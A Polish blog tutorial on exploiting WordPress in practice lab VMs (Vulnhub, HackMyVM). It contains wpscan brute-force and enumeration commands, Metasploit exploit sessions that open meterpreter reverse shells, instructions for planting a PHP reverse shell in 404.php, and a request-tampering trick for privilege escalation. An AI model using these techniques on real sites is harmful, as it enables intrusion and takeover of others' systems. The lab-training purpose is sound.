---
title: "Wordpress i jego podatności"
excerpt: " "
comments: true
categories:
  - Hacking
tags:
  - Hacking
  - CMS
  - Vulnhub
  - HackMyVM
header:
  overlay_image: /assets/images/pasek-hack.png
gallery1_4:
  - url: /assets/images/hacking/2021/21/01.png    
    image_path: /assets/images/hacking/2021/21/01.png      
  - url: /assets/images/hacking/2021/21/02.png    
    image_path: /assets/images/hacking/2021/21/02.png      
  - url: /assets/images/hacking/2021/21/03.png    
    image_path: /assets/images/hacking/2021/21/03.png      
  - url: /assets/images/hacking/2021/21/04.png    
    image_path: /assets/images/hacking/2021/21/04.png      
---

# Wstęp
**Wordpress** ma już prawie dwadzieścia lat (pierwsze wydanie było w 2003 roku). A co to jest? To chyba prawie każdy wie, kto się interesuje **CMS**-ami. Przypomnę, zaczerpnąwszy z definicji **Wikipedii**, że jest to system zarządzania treścią napisany w języku **PHP** korzystający z Bazy **MySQL**. Jest zaprojektowany głównie do obsługi blogów, ale nie tylko. **PHP** i **MySQL** od czasu do czasu łapią jakieś bugi, ale niekoniecznie to jest powodem jego słabości. Tutaj nie będę opisywał, jak zabezpieczyć **Wordpress**a, o tym możesz przeczytać w bardzo ciekawym artykule, który był parę lat temu opisywany na [Sekuraku](https://sekurak.pl/jak-zabezpieczyc-wordpress-poradnik-krok-po-kroku/). Skupię się głównie na tym jak wykorzystać błędy **Wordpress**a na konkretnych maszynach wirtualnych. Wirtualki są z serwisów [vulnhub](https://www.vulnhub.com/) i [hackmyvm](https://hackmyvm.eu). Polecam zwłaszcza ten drugi serwis. Ciągle są dodawane nowe wirtualki. Głównie są one pod Linuxem. Praktycznie w każdej jest jakiś nowy pomysł na zdobycie flag. Czasami to aż głowa od tego pęka, a po fakcie myślisz, jakie to było proste. Za zdobycie konta użytkownika i **root**a jest punktacja. A jeżeli gdzieś utkniesz, to na **Discordzie** są osoby chętne do pomocy. Nie poprowadzą Ciebie za rączkę, ale możliwe, że dostaniesz jakąś wskazówkę. Poza tym większość maszyn ma solucje, a za napisanie też można dostać punkt. Nie musi być po angielsku. Dużo osób pisze w ojczystym języku: polskim, japońskim, hiszpańskim. A co jest dosyć ważne, wszystko jest za darmo.
{: .text-justify}

# Podstawy podstaw
O instalacji się będę rozpisywał, za to opiszę ogólnie konfigurację **Wordpress**a. Czyli co gdzie jest:
{: .text-justify}
## Główne katalogi
- _/var/www/html/_ - Najczęściej główny katalog **Wordpress**a gdzie znajdują się główne pliki konfiguracyjne.
- _/var/www/html/wp-admin/_ - pliki administracyjne, tam jest plik do logowania, pliki instalacyjne, zarządzające pulpitem **Wordpress**a. Możesz też wchodząc z przeglądarki na _http://strona/wp-admin/wp-admin_ się od razu zalogować.
- _/usr/share/wordpress/wp-content/plugins_ - katalog z pluginami, jeżeli jakiś wtyczek nie używasz wyłącz.
- _/usr/share/wordpress/wp-content/uploads_ - Obrazy i multimedia. Bardzo niebezpieczny katalog. Często bywa, że po jest widoczny na zewnątrz, o tym będzie później.
- _/usr/share/wordpress/wp-content/themes_ - Tematy - podobnie jak w temacie pluginów, zostaw tylko ten temat, który używasz.
- _/usr/share/wordpress/wp-includes_ - Jest to jest folder, jak sama nazwa wskazuje, w którym _wp-admin_ dołącza wszystkie pliki potrzebne do uruchomienia strony internetowej.

# Podstawowowe podatności
## wp-config.php
Ciekawym plikiem dla włamywacza jest _/usr/share/wordpress/wp-config.php_ w którym widać hasło, login i nazwę bazy. Po włamaniu się przez **Wordpress**a możemy wejść na **MySql**. Poniżej fragment konfiguracji.
{: .text-justify}

<div class="notice--primary" markdown="1">
/usr/share/wordpress/wp-config.php
<pre>
<p style="background-color:white;">
/** The name of the database for WordPress */
define( 'DB_NAME', 'baza' );
/** MySQL database username */
define( 'DB_USER', 'uzytkownik' );
/** MySQL database password */
define( 'DB_PASSWORD', 'haslo' );
/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
</p>
</pre>
</div>

## /usr/share/wordpress/wp-content/uploads
Jeżeli nie zabezpieczyłeś tego katalogu, a tak było chyba w starszych **Wordpress**ach, każdy z zewnątrz mógł przeglądać katalogi, wchodząc na _https://strona/wp-content/uploads/_. Takie strony łatwo można znaleźć wpisując w **Google** _inurl:"/wp-content/uploads/" site:pl_ Jak to wygląda, możesz też zobaczyć opisie wirtualki. [Vulny](https://kerszl.github.io/hacking/walkthrough/vulny/)
{: .text-justify}

## Użytkownicy
Ciekawym katalogiem jest _https://strona/wp-json/wp/v2/users/_ oraz _https://strona/author/[login]_. Przykład możemy zobaczyć na stronie [Sekuraka](https://sekurak.pl/wp-json/wp/v2/users/) (mam nadzieje, że się nie obrażą na mnie za ten link, ale pewnie to świadomie udostępnili). Możemy również zobaczyć wpisy autora [ac](https://sekurak.pl/author/ac/)
{: .text-justify}

# Przydatne programy
To było sprawdzanie ręczne, ale od czego mamy programy? Znam dwa, ale polecam tylko jeden.
**Wpforce** działał dosyć problemowo i nie jest aktualizowany tak jak **Wpscan**. Wybór jest oczywisty - ten drugi program. Warto się zarejestrować na [stronie](https://wpscan.com/api) i ściągnąć sobie darmowy **TOKEN**. Dzięki temu możemy odczytać 25 darmowych **żądań API** dziennie, a to nam daje rozszerzoną informacje o skanowaniu. Oczywiście możemy tę liczbę zwiększyć, ale za to już dodatkowo się płaci. Bez **TOKEN**a też możemy skanować, jednak wynik nie będzie tak dokładny.
{: .text-justify}

## Wpscan
Podczas skanowania stron internetowych trzeba uważać, żeby nie narobić **szumu**. Niektóre serwisy takie skanowanie odbierają jako próby ataku. Więc najprostszą rzeczą na początek będzie to:
{: .text-justify}
```bash
# wpscan --url https://strona --stealthy --api-token=[twoj token]
```
Szukanie użytkowników już może narobić hałasu:
{: .text-justify}
```bash
# wpscan --enumerate u --url https://strona --api-token=[twoj token]
```
Jeżeli znamy nazwę użytkownika i chcemy znaleźć jego hasło, możemy użyć **brute-force**:
{: .text-justify}
```bash
# wpscan --url https://strona -U uzytkownik -P wpscan -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt --url https://strona --api-token=[twój token]
```
Ostatnia tutaj wspomniana komenda, czyli szukanie podatnych pluginów i tematów. To narobi dużo szumu. Przykład ten, a nawet mocniejszy możecie poćwiczyć na wirtualce [Beloved](https://kerszl.github.io/hacking/walkthrough/beloved/).:
{: .text-justify}
```bash
# wpscan --enumerate vp, vt --url https://strona --api-token=[twój token] 
```

## Metasploit
W programie oprócz funkcji enumeracji **Wordpress**a mamy multum wtyczek. Na początek jednak enumeracja:
{: .text-justify}

### Enumeracja
Tak wygląda, niestety, żeby sprawdzić wszystkie pluginy i zajmuje to trochę czasu:
{: .text-justify}
```console
msf6 > use auxiliary/scanner/http/wordpress_scanner
msf6 auxiliary(scanner/http/wordpress_scanner) > show options

Module options (auxiliary/scanner/http/wordpress_scanner):

   Name          Current Setting                   Required  Description
   ----          ---------------                   --------  -----------
   PLUGINS       true                              no        Detect plugins
   PLUGINS_FILE  /usr/share/metasploit-framework/  yes       File containing plugins to enumerate
                 data/wordlists/wp-plugins.txt
   PROGRESS      1000                              yes       how often to print progress
   Proxies                                         no        A proxy chain of format type:host:port[,type:host:port][
                                                             ...]
   RHOSTS        172.16.1.214                      yes       The target host(s), see https://github.com/rapid7/metasp
                                                             loit-framework/wiki/Using-Metasploit
   RPORT         80                                yes       The target port (TCP)
   SSL           false                             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /                                 yes       The base path to the wordpress application
   THEMES        true                              no        Detect themes
   THEMES_FILE   /usr/share/metasploit-framework/  yes       File containing themes to enumerate
                 data/wordlists/wp-themes.txt
   THREADS       1                                 yes       The number of concurrent threads (max one per host)
   VHOST                                           no        HTTP server virtual host

```

### Shell
Dosyć ciekawym eksploitem jest _wp_admin_shell_upload_. Za jego pomocą możemy wejść na konsolę. Niestety trzeba mieć uprawnienia administratora, po to żeby stworzyć jakiś plugin. Na końcu opiszę, jak czasami możemy sobie zwiększyć uprawnienia.
{: .text-justify}
```console
msf6 auxiliary(scanner/http/wordpress_scanner) > use unix/webapp/wp_admin_shell_upload
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/wp_admin_shell_upload) > show options

Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME                    yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.16.1.10      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

```
### Eksploity

#### wp_file_manager_rce
Ostatnio dosyć popularnym eksploitem (2020-09) jest _WordPress File Manager Unauthenticated Remote Code Execution_. Jest również dostępny w **Metasploicie**. Możesz go przetestować na już wcześniej wspomnianej wirtualce [Vulny](https://kerszl.github.io/hacking/walkthrough/vulny/).
{: .text-justify}

```console
msf6 > use exploit/multi/http/wp_file_manager_rce
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(multi/http/wp_file_manager_rce) > show options

Module options (exploit/multi/http/wp_file_manager_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   COMMAND    upload           yes       elFinder commands used to exploit the vulnerability (Accepted: upload, mkfil
                                         e+put)
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     172.16.1.159     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/
                                         Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path to WordPress installation
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress File Manager 6.0-6.8 
```

#### wp_wpdiscuz_unauthenticated_file_upload
Zastowowanie tego pluginu znajdziesz w [Beloved](https://kerszl.github.io/hacking/walkthrough/beloved/). Poniżej przykład użycia.
{: .text-justify}
```console
msf6 > use exploit/unix/webapp/wp_wpdiscuz_unauthenticated_file_upload
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/wp_wpdiscuz_unauthenticated_file_upload) > set BLOGPATH /2021/06/09/hello-world/
BLOGPATH => /2021/06/09/hello-world/
msf6 exploit(unix/webapp/wp_wpdiscuz_unauthenticated_file_upload) > set rhosts 172.16.1.200
rhosts => 172.16.1.200
msf6 exploit(unix/webapp/wp_wpdiscuz_unauthenticated_file_upload) > set lhost eth0
lhost => eth0
msf6 exploit(unix/webapp/wp_wpdiscuz_unauthenticated_file_upload) > run

[*] Started reverse TCP handler on 172.16.1.10:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[+] Payload uploaded as oRmLwLOvrhs.php
[*] Calling payload...
[*] Sending stage (39282 bytes) to 172.16.1.200
[*] Meterpreter session 1 opened (172.16.1.10:4444 -> 172.16.1.200:34720) at 2021-09-30 11:00:35 +0200


[!] This exploit may require manual cleanup of 'oRmLwLOvrhs.php' on the target
```
#### wp_plainview_activity_monitor_rce
To już dosyć stary plugin, ale pewnie jak poszukasz to go gdzieś znajdziesz w Internecie. Przykład użycia znajdziesz w [Dc6](https://kerszl.github.io/hacking/walkthrough/dc-6/).
{: .text-justify}

# 404.php
Jeżeli mamy możliwość edycji pliku _404.php_, to możemy wstawić tam eksploita. Wchodzimy na _http://strona/wp-admin/_, dalej _tematy http://172.16.1.109/wp-admin/theme-editor.php_ i wrzucamy do _404.php_ po edycji eksploita z [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell). Na naszym serwerze uruchamiamy **nasłuchiwacza** komendą _nc -lvnp 1234_, a na **Wordpressie** odpalamy jakąś stronę której nie ma, np. _http://strona/?p=1234_. Możesz to przećwiczyć na [colddbox-easy](https://www.vulnhub.com/entry/colddbox-easy,586/). Solucje znajdziesz [tu](https://infosecwriteups.com/tryhackme-colddbox-easy-write-up-2bb4d113b79d)
{: .text-justify}

# Zwiększanie uprawnień użytkownika
Jeżeli zalogowaliśmy się na jakieś konto (nie admina) i chcemy sobie zwiększyć uprawnienia, to czasami udaje się pewna sztuczka. Do niej użyjemy programu **Burp Suite** https://portswigger.net/burp. W **Wordpress**ie zaś wchodzimy na _users->"your profile"->"update profile"_. Przechwytujemy zapytanie nagłówka _POST /wp-admin/profile.php HTTP/1.1_ i dodajemy na koniec *&ure_other_roles=administrator*. Było to sprawdzane ne **Wordpress**ie w wersji 5.1.1 i 5.8.1. Poniżej przykładowe obrazki z tej akcji:
{: .text-justify}
{% include gallery id="gallery1_4" %}

# Koniec
W miarę możliwości będę aktualizować ten wpis. A Jeżeli znalazłe(a)ś jakieś błędy lub znasz ciekawe podatności **Wordpress**a napisz mejla na [kerszi@protonmail.com](mailto:kerszi@protonmail.com). Ciekawe pomysły tutaj zamieszczę.
{: .text-justify}